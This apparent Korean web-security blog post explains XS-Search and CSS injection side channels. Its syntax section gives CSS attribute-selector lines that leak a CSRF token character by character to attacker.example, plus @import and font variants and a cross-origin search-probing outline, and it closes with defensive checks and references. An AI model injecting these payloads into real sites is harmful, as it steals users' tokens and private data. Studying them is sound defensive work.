---
title: "XS-Search와 CSS 데이터 유출"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, Client]
tags: [xs-search, css-injection, side-channel, web]
description: "스크립트 없이 응답 크기·시간·상태나 CSS 선택자·폰트로 비공개 정보를 한 비트씩 추론하는 XS-Search·CSS 유출 사이드 채널의 개념과 구문을 정리합니다."
mermaid: true
---

> 스크립트를 주입하지 못해도, **관찰 가능한 차이**(응답 크기·시간·상태, 요소의 존재·스타일)만으로 비공개 정보를 한 비트씩 추론할 수 있다. XS-Search와 CSS 기반 유출이 대표적인 사이드 채널이다.

## 개념

- **XS-Search**: 교차 출처에서 피해자 세션으로 검색/필터 요청을 유발하고, "결과가 있냐 없냐"에 따른 **응답 시간·크기·상태·프레임 동작 차이**로 비공개 데이터(이메일·메모 내용)를 질문-응답식으로 추론한다.
- **CSS 유출**: HTML 주입은 되지만 스크립트는 막힐 때, 속성 선택자 + `background:url()`로 **값이 맞을 때만 외부 요청**을 보내 한 글자씩 뽑는다. 폰트·`@import`로도 구현된다.

## 공격·우회 구문

허가된 범위에서만. 무해한 증거(OAST)로.

### CSS 속성 선택자 유출 (한 글자씩)

```css
input[name="csrf"][value^="a"]{background:url(//attacker.example/?a)}
input[name="csrf"][value^="b"]{background:url(//attacker.example/?b)}
/* 맞는 접두사일 때만 요청 도착 → 접두사를 늘려가며 전체 값 복원 */
```

### 폰트·@import 변형

```
@font-face + unicode-range 로 특정 문자 포함 시 폰트 로드 → 존재 여부 유출
@import url(//attacker.example/next.css) 로 단계적 유출(순차 질의)
```

### XS-Search (교차 출처 추론)

```
<iframe>/이미지/링크로 피해자 세션의 검색 요청 유발:
  https://target/search?q=secret_guess
관찰: onload/onerror, 응답 시간, 프레임 수, 캐시 적중, 요소 크기 변화
결과 유무가 신호 → 이진 탐색으로 비공개 값 추론
```

### 방어 신호 확인

```
민감 응답에 X-Frame-Options/frame-ancestors, SameSite 쿠키, 캐시 분리
응답 크기·시간을 상수화했는지, CSP 가 외부 url()/import 를 막는지
```

## 참고 자료

- [XS-Leaks Wiki](https://xsleaks.dev/)
- [CWE-203: Observable Discrepancy](https://cwe.mitre.org/data/definitions/203.html)
- [CWE-1021: Improper Restriction of Rendered UI Layers or Frames](https://cwe.mitre.org/data/definitions/1021.html)
